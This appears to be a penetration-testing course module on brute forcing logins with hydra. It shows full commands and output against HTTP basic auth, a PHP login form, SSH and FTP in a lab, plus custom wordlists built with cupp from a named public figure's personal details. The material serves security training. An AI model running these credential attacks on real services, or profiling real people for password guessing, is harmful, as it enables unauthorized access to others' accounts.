# Introduction to Brute Forcing

* * *

A [Brute Force](https://en.wikipedia.org/wiki/Brute-force_attack) attack is a method of attempting to guess passwords or keys by automated probing. An example of a brute-force attack is password cracking. Passwords are usually not stored in clear text on the systems but as hash values.

Here is a small list of files that can contain hashed passwords:

| **`Windows`** | **`Linux`** |
| --- | --- |
| unattend.xml | shadow |
| sysprep.inf | shadow.bak |
| SAM | password |

Since the password cannot be calculated backward from the hash value, the brute force method determines the hash values belonging to the randomly selected passwords until a hash value matches the stored hash value. In this case, the password is found. This method is also called offline brute-forcing. This module will focus on online brute-forcing and explicitly deal with the websites' login forms.

On most websites, there is always a login area for administrators, authors, and users somewhere. Furthermore, usernames are often recognizable on the web pages, and complex passwords are rarely used because they are difficult to remember. Therefore it is worth using the online brute forcing method after a proper enumeration if we could not identify any initial foothold.

There are many tools and methods to utilize for login brute-forcing, like:

- `Ncrack`
- `wfuzz`
- `medusa`
- `patator`
- `hydra`
- and others.

In this module, we will be mainly using `hydra`, as it is one of the most common and reliable tools available.

The following topics will be discussed:

- Brute forcing basic HTTP auth
- Brute force for default passwords
- Brute forcing login forms
- Brute force usernames
- Creating personalized username and password wordlists based on our target
- Brute forcing service logins, such as FTP and SSH


# Password Attacks

* * *

We found an unusual host on the network during our black box penetration test and had a closer look at it. We discovered a web server on it that is running on a non-standard port. Many web servers or individual contents on the web servers are still often used with the [Basic HTTP AUTH](https://tools.ietf.org/html/rfc7617) scheme. Like in our case, we found such a webserver with such a path, which should arouse some curiosity.

The HTTP specification provides two parallel authentication mechanisms:

1. `Basic HTTP AUTH` is used to authenticate the user to the HTTP server.

2. `Proxy Server Authentication` is used to authenticate the user to an intermediate proxy server.


These two mechanisms work very similarly as they use requests, response status codes, and response headers. However, there are differences in the status codes and header names used.

The Basic HTTP Authentication scheme uses user ID and password for authentication. The client sends a request without authentication information with its first request. The server's response contains the `WWW-Authenticate` header field, which requests the client to provide the credentials. This header field also defines details of how the authentication has to take place. The client is asked to submit the authentication information. In its response, the server transmits the so-called realm, a character string that tells the client who is requesting the data. The client uses the Base64 method for encoding the identifier and password. This encoded character string is transmitted to the server in the Authorization header field.

![](https://academy.hackthebox.com/storage/modules/57/bruteforcing_401.jpg)

As we don't have any credentials, nor do we have any other ports available, and no services or information about the webserver to be able to use or attack, the only option left is to utilize password brute-forcing.

There are several types of password attacks, such as:

| **Password Attack Type** |
| --- |
| `Dictionary attack` |
| `Brute force` |
| `Traffic interception` |
| `Man In the Middle` |
| `Key Logging` |
| `Social engineering` |

We will mainly focus on `Brute Force` and `Dictionary Attacks`. Both of these attacks will find the password by `brute forcing` the service.

* * *

## Brute Force Attack

A `Brute Force Attack` does not depend on a wordlist of common passwords, but it works by trying all possible character combinations for the length we specified. For example, if we specify the password's length as `4`, it would test all keys from `aaaa` to `zzzz`, literally `brute forcing` all characters to find a working password.

However, even if we only use lowercase English characters, this would have almost half a million permutations - `26x26x26x26 = 456,976`-, which is a huge number, even though we only have a password length of `4`.

Once the password length starts to increase, and we start testing for mixed casings, numbers, and special characters, the time it would take to brute force, these passwords can take millions of years.

All of this shows that relying completely on brute force attacks is not ideal, and this is especially true for brute-forcing attacks that take place over the network, like in `hydra`.

That is why we should consider methods that may increase our odds of guessing the correct password, like `Dictionary Attacks`.

* * *

## Dictionary Attack

A `Dictionary Attack` tries to guess passwords with the help of lists. The goal is to use a list of known passwords to guess an unknown password. This method is useful whenever it can be assumed that passwords with reasonable character combinations are used.

Luckily, there is a huge number of passwords wordlist, consisting of the most commonly used passwords found in tests and database leaks.

We can check out the [SecLists](https://github.com/danielmiessler/SecLists) repo for wordlists, as it has a huge variety of wordlists, covering many types of attacks.

We can find password wordlists in our PwnBox in `/opt/useful/SecLists/Passwords/`, and username wordlists in `/opt/useful/SecLists/Usernames/`.

* * *

## Methods of Brute Force Attacks

There are many methodologies to carry a Login Brute Force attacks:

| **Attack** | **Description** |
| --- | --- |
| Online Brute Force Attack | Attacking a live application over the network, like HTTP, HTTPs, SSH, FTP, and others |
| Offline Brute Force Attack | Also known as Offline Password Cracking, where you attempt to crack a hash of an encrypted password. |
| Reverse Brute Force Attack | Also known as username brute-forcing, where you try a single common password with a list of usernames on a certain service. |
| Hybrid Brute Force Attack | Attacking a user by creating a customized password wordlist, built using known intelligence about the user or the service. |


# Default Passwords

* * *

Default passwords are often used for user accounts for testing purposes. They are easy to remember and are also used for default accounts of services and applications intended to simplify first access. It is not uncommon for such user accounts to be overlooked or forgotten. Due to the natural laziness of man, everyone tries to make it as comfortable as possible. This, in turn, leads to inattentiveness and the resulting errors, which can harm the company's infrastructure.

As we saw when we visited the website, it prompted the `Basic HTTP Authentication` form to input the username and password. Basic HTTP Authentication usually responses with an HTTP `401 Unauthorized` response code. As we mentioned previously, we will resort to a Brute Forcing attack, as we do not have enough information to attempt a different type of attack, which we will cover in this section.

* * *

## Hydra

`Hydra` is a handy tool for Login Brute Forcing, as it covers a wide variety of attacks and services and is relatively fast compared to the others. It can test any pair of credentials and verify whether they are successful or not but in huge numbers and a very quick manner.

If we want to use it on our own machine, we can either use " `apt install hydra -y`" or download it and use it from its [Github Repository](https://github.com/vanhauser-thc/thc-hydra) but its pre-installed on Pwnbox.

We can take a look at the options that `hydra` provides and see its flags and examples of how it can be used:

```shell
hydra -h

Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]

Options:
<...SNIP...>
  -s PORT   if the service is on a different default port, define it here
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE
  -u        loop around users, not passwords (effective! implied with -x)
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)
  service   the service to crack (see below for supported protocols)

<...SNIP...>

Examples:
  hydra -l user -P passlist.txt ftp://192.168.0.1
  hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN
  hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5
  hydra -l admin -p password ftp://[192.168.0.0/24]/
  hydra -L logins.txt -P pws.txt -M targets.txt ssh

```

* * *

## Default Passwords

As we don't know which user to brute force, we will have to brute force both fields. We can either provide different wordlists for the usernames and passwords and iterate over all possible username and password combinations. However, we should keep this as a last resort.

It is very common to find pairs of usernames and passwords used together, especially when default service passwords are kept unchanged. That is why it is better to always start with a wordlist of such credential pairs -e.g. `test:test`-, and scan all of them first.

This should not take a long time, and if we could not find any working pairs, we would move to use separate wordlists for each or search for the top 100 most common passwords that can be used.

We can find a list of default password login pairs in the [SecLists](https://github.com/danielmiessler/SecLists) repository as well, specifically in the `/opt/useful/SecLists/Passwords/Default-Credentials` directory within Pwnbox. In this case, we will pick `ftp-betterdefaultpasslist.txt` as it seems to be the most relevant to our case since it contains a variety of default user/password combinations. We will be using the following flags, based on help page above:

| **Options** | **Description** |
| --- | --- |
| `-C ftp-betterdefaultpasslist.txt` | Combined Credentials Wordlist |
| `SERVER_IP` | Target IP |
| `-s PORT` | Target Port |
| `http-get` | Request Method |
| `/` | Target Path |

The assembled command results:

```shell
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-get://178.211.23.155:31099/
[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
[STATUS] attack finished for 178.211.23.155 (valid pair found)
1 of 1 target successfully completed, 1 valid password found

```

It's pretty common for administrators to overlook test or default accounts and their credentials.
That is why it is always advised to start by scanning for default credentials, as they are very commonly left unchanged. It is even worth testing for the top 3-5 most common default credentials manually, as it can very often be found to be used.

We can visit the website again and try the same pair to verify that they do work:
![](https://academy.hackthebox.com/storage/modules/57/bruteforcing_index.jpg)

As we can see, we do get access, and the pair indeed works. Next, we can try to attempt running the second type of scan by separate user wordlists for usernames and passwords and see how long it takes to find the same pair we just identified.


# Username Brute Force

We now know the basic usage of `hydra`, so let us try another example of attacking HTTP basic auth by using separate wordlists for usernames and passwords.

* * *

## Wordlists

One of the most commonly used password wordlists is `rockyou.txt`, which has over 14 million unique passwords, sorted by how common they are, collected from online leaked databases of passwords and usernames. Basically, unless a password is truly unique, this wordlist will likely contain it. `Rockyou.txt` already exists in our Pwnbox. If we were using `hydra` on a local VM, we could download this wordlist from the [Hashcat GitHub Repository](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt). We can find it in the following directory:

```shell
locate rockyou.txt

/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt

```

As for our usernames wordlist, we will utilize the following wordlist from `SecLists`:

```shell
locate names.txt

/opt/useful/SecLists/Usernames/Names/names.txt

```

This is a short list of common usernames that may be found on any server.

* * *

## Username/Password Attack

`Hydra` requires at least 3 specific flags if the credentials are in one single list to perform a brute force attack against a web service:

1. `Credentials`
2. `Target Host`
3. `Target Path`

Credentials can also be separated by `usernames` and `passwords`. We can use the `-L` flag for the usernames wordlist and the `-P` flag for the passwords wordlist. Since we don't want to brute force all the usernames in combination with the passwords in the lists, we can tell `hydra` to stop after the first successful login by specifying the flag `-f`.

Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.

```shell
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /

[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
[DATA] attacking http-get://178.35.49.134:32901/
[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active

<...SNIP...>
[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1

[STATUS] attack finished for SERVER_IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found

```

We see that we can still find the same working pair, but in this case, it took much longer to find them, taking nearly 30 minutes to do so. This is because while default passwords are commonly used together, they clearly are not among the top when it comes to individual wordlists. So, either the username or the password is buried deep into our wordlist, taking much longer to reach.

* * *

## Username Brute Force

If we were to only brute force the username or password, we could assign a static username or password with the same flag but lowercase. For example, we can brute force passwords for the `test` user by adding `-l test`, and then adding a password word list with `-P rockyou.txt`.

Since we already found the password in the previous section, we may statically assign it with the " `-p`" flag, and only brute force for usernames that might use this password.

```shell
hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
[DATA] attacking http-get://178.35.49.134:32901/

[32901][http-get] host: 178.35.49.134   login: abbas   password: amormio
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)

```


# Hydra Modules

* * *

Since we found a login form on the webserver for administrators during our penetration testing engagement, it is a very interesting component to which we should try to gain access without generating much network traffic. Finally, with the admin panels, we can manage servers, their services, and configurations. Many admin panels have also implemented features or elements such as the [b374k shell](https://github.com/b374k/b374k) that might allow us to execute OS commands directly.

* * *

## Login.php

![](https://academy.hackthebox.com/storage/modules/57/web_fnb_admin_login_1.jpg)

To cause as little network traffic as possible, it is recommended to try the top 10 most popular administrators' credentials, such as `admin:admin`.

If none of these credentials grant us access, we could next resort to another widespread attack method called password spraying. This attack method is based on reusing already found, guessed, or decrypted passwords across multiple accounts. Since we have been redirected to this admin panel, the same user may have access here.

* * *

## Brute Forcing Forms

`Hydra` provides many different types of requests we can use to brute force different services. If we use `hydra -h`, we should be able to list supported services:

```shell
hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

Supported			        ldap3[-{cram|digest}md5][s]	rsh
services			        memcached					rtsp
				            mongodb						s7-300
adam6500			        mssql						sip
asterisk			        mysql						smb
cisco				        nntp						smtp[s]
cisco-enable		        oracle-listener				smtp-enum
cvs				            oracle-sid					snmp
firebird			        pcanywhere					socks5
ftp[s]				        pcnfs						ssh
http[s]-{head|get|post}		pop3[s]						sshkey
http[s]-{get|post}-form		postgres					svn
http-proxy		        	radmin2						teamspeak
http-proxy-urlenum		    rdp				  		    telnet[s]
icq				            redis						vmauthd
imap[s]		        		rexec						vnc
irc				            rlogin						xmpp
ldap2[s]		        	rpcap

```

In this situation there are only two types of `http` modules interesting for us:

1. `http[s]-{head|get|post}`
2. `http[s]-post-form`

The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like `.php` or `.aspx` and others.

Since the file extension is " `.php`" we should try the `http[s]-post-form` module. To decide which module we need, we have to determine whether the web application uses `GET` or a `POST` form. We can test it by trying to log in and pay attention to the URL. If we recognize that any of our input was pasted into the `URL`, the web application uses a `GET` form. Otherwise, it uses a `POST` form.

![](https://academy.hackthebox.com/storage/modules/57/web_fnb_admin_login_1.jpg)

When we try to log in with any credentials and don't see any of our input in the URL, and the URL does not change, we know that the web application uses a `POST` form.

Based on the URL scheme at the beginning, we can determine whether this is an `HTTP` or `HTTPS` post-form. If our target URL shows `http`, in this case, we should use the `http-post-form` module.

To find out how to use the `http-post-form` module, we can use the " `-U`" flag to list the parameters it requires and examples of usage:

```shell
hydra http-post-form -U

<...SNIP...>
Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
First is the page on the server to GET or POST to (URL).
Second is the POST/GET variables ...SNIP... usernames and passwords being replaced in the
 "^USER^" and "^PASS^" placeholders
The third is the string that it checks for an *invalid* login (by default)
 Invalid condition login check can be preceded by "F=", successful condition
 login check must be preceded by "S=".

<...SNIP...>

Examples:
 "/login.php:user=^USER^&pass=^PASS^:incorrect"

```

In summary, we need to provide three parameters, separated by `:`, as follows:

1. `URL path`, which holds the login form
2. `POST parameters` for username/password
3. `A failed/success login string`, which lets hydra recognize whether the login attempt was successful or not

For the first parameter, we know the URL path is:

```shell
/login.php

```

The second parameter is the POST parameters for username/passwords:

```shell
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^

```

The third parameter is a failed/successful login attempt string. We cannot log in, so we do not know how the page would look like after a successful login, so we cannot specify a `success` string to look for.

```shell
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]

```

* * *

## Fail/Success String

To make it possible for `hydra` to distinguish between successfully submitted credentials and failed attempts, we have to specify a unique string from the source code of the page we're using to log in. `Hydra` will examine the HTML code of the response page it gets after each attempt, looking for the string we provided.

We can specify two different types of analysis that act as a Boolean value.

| **Type** | **Boolean Value** | **Flag** |
| --- | --- | --- |
| `Fail` | FALSE | `F=html_content` |
| `Success` | TRUE | `S=html_content` |

If we provide a `fail` string, it will keep looking until the string is **not found** in the response. Another way is if we provide a `success` string, it will keep looking until the string is **found** in the response.

Since we cannot log in to see what response we would get if we hit a `success`, we can only provide a string that appears on the `logged-out` page to distinguish between logged-in and logged-out pages.

So, let's look for a unique string so that if it is missing from the response, we must have hit a successful login. This is usually set to the error message we get upon a failed login, like `Invalid Login Details`. However, in this case, it is a little bit trickier, as we do not get such an error message. So is it still possible to brute force this login form?

We can take a look at our login page and try to find a string that only shows in the login page, and not afterwards. For example, one distinct string is `Admin Panel`:
![](https://academy.hackthebox.com/storage/modules/57/web_fnb_admin_login_1.jpg)

So, we may be able to use `Admin Panel` as our fail string. However, this may lead to false-positives because if the `Admin Panel` also exists in the page after logging in, it will not work, as `hydra` will not know that it was a successful login attempt.

A better strategy is to pick something from the HTML source of the login page.

What we have to pick should be very _unlikely_ to be present after logging in, like the **login button** or the _password field_. Let's pick the login button, as it is fairly safe to assume that there will be no login button after logging in, while it is possible to find something like `please change your password` after logging in.

We can click `[Ctrl + U]` in Firefox to show the HTML page source, and search for `login`:

```HTML
  <form name='login' autocomplete='off' class='form' action='' method='post'>

```

We see it in a couple of places as title/header, and we find our button in the HTML form shown above. We do not have to provide the entire string, so we will use `<form name='login'`, which should be distinct enough and will probably not exist after a successful login.

So, our syntax for the `http-post-form` should be as follows:

```bash
"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"

```


# Determine Login Parameters

* * *

We can easily find POST parameters if we intercept the login request with Burp Suite or take a closer look at the admin panel's source code.

* * *

## Using Browser

One of the easiest ways to capture a form's parameters is through using a browser's built in developer tools. For example, we can open firefox within PwnBox, and then bring up the Network Tools with `[CTRL + SHIFT + E]`.

Once we do, we can simply try to login with any credentials ( `test`: `test`) to run the form, after which the Network Tools would show the sent HTTP requests. Once we have the request, we can simply right-click on one of them, and select `Copy` \> `Copy POST data`:

![FoxyProxy](https://academy.hackthebox.com/storage/modules/57/bruteforcing_firefox_network_1.jpg)

This would give us the following POST parameters:

```bash
username=test&password=test

```

Another option would be to used `Copy` \> `Copy as cURL`, which would copy the entire `cURL` command, which we can use in the Terminal to repeat the same HTTP request:

```shell
curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'

```

As we can see, this command also contains the parameters `--data-raw 'username=test&password=test'`.

* * *

## Using Burp Suite

In case we were dealing with a web page that sends many HTTP requests, it may be easier to use Burp Suite in order to go through all sent HTTP requests, and pick the ones we are interested in. To do that, we will first start BurpSuite from Application Dock at the bottom in Pwnbox, skip all the messages until the application starts, and then Click on the `Proxy` tab:

![FoxyProxy](https://academy.hackthebox.com/storage/modules/57/web_fnb_burp.jpg)

Next, We will go to Firefox and enable the `Burp Proxy` by clicking on the `FoxyProxy` button in Firefox, and then choosing `Burp`, as seen in the screenshot below:

![FoxyProxy](https://academy.hackthebox.com/storage/modules/57/bruteforcing_foxyproxy_1.jpg)

Now, all we will do is attempt a login with any username/password 'e.g. `admin:admin`', and go back to BurpSuite, to find the login request captured:
![FoxyProxy](https://academy.hackthebox.com/storage/modules/57/bruteforcing_burp_request_1.jpg)

Tip: If we find another request captured, we can click "Forward" until we reach our request from "/login.php".

What we need from the above-captured string is the very last line:

```bash
username=admin&password=admin

```

To use in a `hydra http-post-form`, we can take it as is, and replace the username/password we used `admin:admin` with `^USER^` and `^PASS^`. The specification of our final target path should be as follows:

```bash
"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

```


# Login Form Attacks

* * *

In our situation, we don't have any information about the existing usernames or passwords. Since we enumerated all available ports to us and we couldn't determine any useful information, we have the option to test the web application form for default credentials in combination with the `http-post-form` module.

* * *

## Default Credentials

Let's try to use the `ftp-betterdefaultpasslist.txt` list with the default credentials to test if one of the accounts is registered in the web application.

```shell
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.1 (c) d020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)

```

As we can see, we were not able to identify any working credentials. Still, this only took a few seconds, and we ruled out the use of default passwords. Now, we can move on to use a password wordlist.

* * *

## Password Wordlist

Since the brute force attack failed using default credentials, we can try to brute force the web application form with a specified user. Often usernames such as `admin`, `administrator`, `wpadmin`, `root`, `adm`, and similar are used in administration panels and are rarely changed. Knowing this fact allows us to limit the number of possible usernames. The most common username administrators use is `admin`. In this case, we specify this username for our next attempt to get access to the admin panel.

```shell
hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'

[PORT][http-post-form] host: 178.35.49.134   login: admin   password: password123
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)

```

We can try to log in with these credentials now:
![](https://academy.hackthebox.com/storage/modules/57/bruteforcing_logged_in_1.jpg)


# Personalized Wordlists

* * *

To create a personalized wordlist for the user, we will need to collect some information about them. As our example here is a known public figure, we can check out their [Wikipedia page](https://en.wikipedia.org/wiki/Bill_Gates) or do a basic Google search to gather the necessary information. Even if this was not a known figure, we can still carry out the same attack and create a personalized wordlist for them. All we need to do is gather some information about them, which is discussed in detail in the [Hashcat](https://academy.hackthebox.com/module/details/20) module, so feel free to check it out.

* * *

## CUPP

Many tools can create a custom password wordlist based on certain information. The tool we will be using is `cupp`, which is pre-installed in your PwnBox. If we are doing the exercise from our own VM, we can install it with `sudo apt install cupp` or clone it from the [Github repository](https://github.com/Mebus/cupp). `Cupp` is very easy to use. We run it in interactive mode by specifying the `-i` argument, and answer the questions, as follows:

```shell
cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | [email protected] ]
                            [ Mebus | https://github.com/Mebus/]

[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: William
> Surname: Gates
> Nickname: Bill
> Birthdate (DDMMYYYY): 28101955

> Partners) name: Melinda
> Partners) nickname: Ann
> Partners) birthdate (DDMMYYYY): 15081964

> Child's name: Jennifer
> Child's nickname: Jenn
> Child's birthdate (DDMMYYYY): 26041996

> Pet's name: Nila
> Company name: Microsoft

> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to william.txt, counting 43368 words.
[+] Now load your pistolero with william.txt and shoot! Good luck!

```

And as a result, we get our personalized password wordlist saved as `william.txt`.

* * *

## Password Policy

The personalized password wordlist we generated is about 43,000 lines long. Since we saw the password policy when we logged in, we know that the password must meet the following conditions:

1. 8 characters or longer
2. contains special characters
3. contains numbers

So, we can remove any passwords that do not meet these conditions from our wordlist.
Some tools would convert password policies to `Hashcat` or `John` rules, but `hydra` does not support rules for filtering passwords. So, we will simply use the following commands to do that for us:

```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers

```

We see that these commands shortened the wordlist from 43k passwords to around 13k passwords, around 70% shorter.

* * *

## Mangling

It is still possible to create many permutations of each word in that list. We never know how our target thinks when creating their password, and so our safest option is to add as many alterations and permutations as possible, noting that this will, of course, take much more time to brute force.

Many great tools do word mangling and case permutation quickly and easily, like [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist.git). These tools have many other options, which can make any small wordlist reach millions of lines long. We should keep these tools in mind because we might need them in other modules and situations.

As a starting point, we will stick to the wordlist we have generated so far and not perform any mangling on it. In case our wordlist does not hit a successful login, we will go back to these tools and perform some mangling to increase our chances of guessing the password.

Tip: The more mangled a wordlist is, the more chances you have to hit a correct password, but it will take longer to brute force. So, always try to be efficient, and properly customize your wordlist using the intelligence you gathered.

* * *

## Custom Username Wordlist

We should also consider creating a personalized username wordlist based on the person's available details. For example, the person's username could be `b.gates` or `gates` or `bill`, and many other potential variations. There are several methods to create the list of potential usernames, the most basic of which is simply writing it manually.

One such tool we can use is [Username Anarchy](https://github.com/urbanadventurer/username-anarchy), which we can clone from GitHub, as follows:

```shell
git clone https://github.com/urbanadventurer/username-anarchy.git

Cloning into 'username-anarchy'...
remote: Enumerating objects: 386, done.
remote: Total 386 (delta 0), reused 0 (delta 0), pack-reused 386
Receiving objects: 100% (386/386), 16.76 MiB | 5.38 MiB/s, done.
Resolving deltas: 100% (127/127), done.

```

This tool has many use cases that we can take advantage of to create advanced lists of potential usernames. However, for our simply use case, we can simply run it and provide the first/last names as arguments, and forward the output into a file, as follows:

```bash
./username-anarchy Bill Gates > bill.txt

```

We should finally have our username and passwords wordlists ready and we could attack the SSH server.


# Service Authentication Brute Forcing

* * *

## SSH Attack

The command used to attack a login service is fairly straightforward. We simply have to provide the username/password wordlists, and add `service://SERVER_IP:PORT` at the end. As usual, we will add the `-u -f` flags. Finally, when we run the command for the first time, `hydra` will suggest that we add the `-t 4` flag for a max number of parallel attempts, as many `SSH` limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped. Our final command should be as follows:

```shell
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
[DATA] attacking ssh://178.35.49.134:22/
[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active
[PORT][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...
[STATUS] attack finished for 178.35.49.134 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)

```

We see that it takes some time to finish, but eventually, we get a working pair, and we identify the user `b.gates`. Now, we can attempt ssh-ing in using the credentials we got:

```shell
ssh [email protected] -p 22

b.gates@SERVER_IP's password: ********

b.gates@bruteforcing:~$ whoami
b.gates

```

As we can see, we can `SSH` in, and get a shell on the server.

* * *

## FTP Brute Forcing

Once we are in, we can check out what other users are on the system:

```shell
b.gates@bruteforcing:~$ ls /home

b.gates  m.gates

```

We notice another user, `m.gates`. We also notice in our local `recon` that port `21` is open locally, indicating that an `FTP` must be available:

```shell
b.gates@bruteforcing:~$ netstat -antp | grep -i list

(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -

```

Next, we can try brute forcing the `FTP` login for the `m.gates` user now.

Note 1: Sometimes administrators test their security measures and policies with different tools. In this case, the administrator of this web server kept "hydra" installed. We can benefit from it and use it against the local system by attacking the FTP service locally or remotely.

Note 2: "rockyou-10.txt" can be found in "/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt", which contains 92 passwords in total. This is a shorter version of "rockyou.txt" which includes 14,344,391 passwords.

So, similarly to how we attacked the `SSH` service, we can perform a similar attack on `FTP`:

```shell
b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
[DATA] attacking ftp://127.0.0.1:21/

[21][ftp] host: 127.0.0.1   login: m.gates   password: <...SNIP...>
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra)

```

We can now attempt to `FTP` as that user, or even switch to that user. Let us try both:

```shell
b.gates@bruteforcing:~$ ftp 127.0.0.1

Connected to 127.0.0.1.
220 (vsFTPd 3.0.3)
Name (127.0.0.1:b.gates): m.gates

331 Please specify the password.
Password:

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir

200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1001           33 Sep 11 00:06 flag.txt
226 Directory send OK.

```

And to switch to that user:

```shell
b.gates@bruteforcing:~$ su - m.gates

Password: *********
m.gates@bruteforcing:~$

```

```shell
m.gates@bruteforcing:~$ whoami

m.gates

```


# Skills Assessment

* * *

Our customer requested an additional black box penetration test for another host on its network. After our host and port scans, we discovered just one single TCP port open. Since we've already found weak credentials on the other host, the new host may be vulnerable to the same vulnerability type. We should consider different wordlists as well during our engagement.


# Skills Assessment

* * *

